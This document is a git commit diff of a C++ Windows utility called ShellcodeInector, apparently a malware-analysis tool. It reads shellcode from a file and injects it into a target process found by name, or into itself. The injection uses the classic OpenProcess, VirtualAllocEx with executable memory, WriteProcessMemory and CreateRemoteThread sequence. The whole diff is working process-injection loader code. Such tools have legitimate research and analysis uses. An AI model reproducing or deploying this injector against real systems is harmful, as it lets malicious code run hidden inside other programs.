2e9713402cc06f10af28b9dacff80a184354a989
Lorenzo Maffia <lmaffia@malwarebytes.com>
2021-07-02 02:56:26 -0700

    Added self-injection, modified shellcode parsing

--- ShellcodeInector/ShellcodeInector.cpp
+++ ShellcodeInector/ShellcodeInector.cpp
@@ -42,28 +42,56 @@ DWORD FindProcessId(const std::wstring& processName)
 
 int main(int argc, char** argv) {
 
-	if (argc < 3) {
-		printf("Usage: %s <shellcode_file_path> <processToInject>", argv[0]);
+	LPVOID pointer_after_allocated;
+	HANDLE processHandle;
+	FILE* file;
+	string processToInject;
+
+	bool selfInjection = true;
+
+	if (argc < 2 || argc > 3) {
+		printf("Usage: %s <shellcode_file_path> [processToInject:if empty, self-injection]", argv[0]);
 		exit(1);
 	}
+	else if (argc == 3) {
+		selfInjection = false;
+		processToInject = string(argv[2]);
+	}
 
-	char * shellcodeFileName  = argv[1];
-	string processToInject = string(argv[2]);
-	LPVOID pointer_after_allocated;
-	
+	char* shellcodeFileName = argv[1];
+
+
 	/* Reading shellcode file */
-	stringstream strStream; ifstream inFile;
-	inFile.open(shellcodeFileName); //open the input file
-	strStream << inFile.rdbuf(); //read the file
-	std::string buffer = strStream.str(); //str holds the content of the file
-	size_t shellcodeLen = buffer.length();
-	printf("[+]%d bytes of shellcode to inject\n", shellcodeLen);
 
-	// Open process to Inject 
-	std::wstring ws(processToInject.begin(), processToInject.end());
-	DWORD pid = FindProcessId(ws);
-	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	if (process_handle == NULL)
+	fopen_s(&file, shellcodeFileName, "rb");
+
+	if (!file) {
+		printf("[-] Error: Unable to open %s\n", shellcodeFileName);
+		exit(1);
+	}
+	fseek(file, 0, SEEK_END);
+	size_t shellcodeLen = ftell(file); //Get Length
+
+	printf("[+] File Size: %d bytes\n", shellcodeLen);
+	fseek(file, 0, SEEK_SET); //Reset
+
+	shellcodeLen += 1;
+
+	char* buffer = (char*)malloc(shellcodeLen); //Create Buffer
+	fread(buffer, shellcodeLen, 1, file);
+	fclose(file);
+
+	// Open process to Inject
+	if (selfInjection) {
+		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+	}
+	else {
+		std::wstring ws(processToInject.begin(), processToInject.end());
+		DWORD pid = FindProcessId(ws);
+		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	}
+
+	if (processHandle == NULL)
 	{
 		puts("[-]Error while opening the process\n");
 		exit(2);
@@ -71,19 +99,19 @@ int main(int argc, char** argv) {
 	puts("[+] Process Opened sucessfully\n");
 
 	// Allocate memory in the remote process
-	pointer_after_allocated = VirtualAllocEx(process_handle, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	pointer_after_allocated = VirtualAllocEx(processHandle, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (pointer_after_allocated == NULL) {
 		puts("[-]Error while get the base address to write\n");
-		
+
 	}
-	printf("[+]Got the address to write %p\n", pointer_after_allocated);
+	printf("[+]Got the address to write 0x%p\n", pointer_after_allocated);
 
 	// Writing process memory with our shellcode
-	size_t writtenBytes;
-	if (WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated, (LPCVOID)buffer.c_str(), shellcodeLen, &writtenBytes) && writtenBytes == shellcodeLen) {
+	SIZE_T writtenBytes;
+	if (WriteProcessMemory(processHandle, (LPVOID)pointer_after_allocated, (LPCVOID)buffer, shellcodeLen, &writtenBytes) && writtenBytes == shellcodeLen) {
 		printf("[+]Shellcode correctly injected\nPress a key to run the shellcode as new thread !\n");
 		getchar();
-		CreateRemoteThread(process_handle, NULL, 100, (LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, (LPDWORD)0x50002);
+		CreateRemoteThread(processHandle, NULL, 100, (LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, (LPDWORD)0x50002);
 	}
 	else {
 		puts("[-]Error while writing shellcode in memory\n");
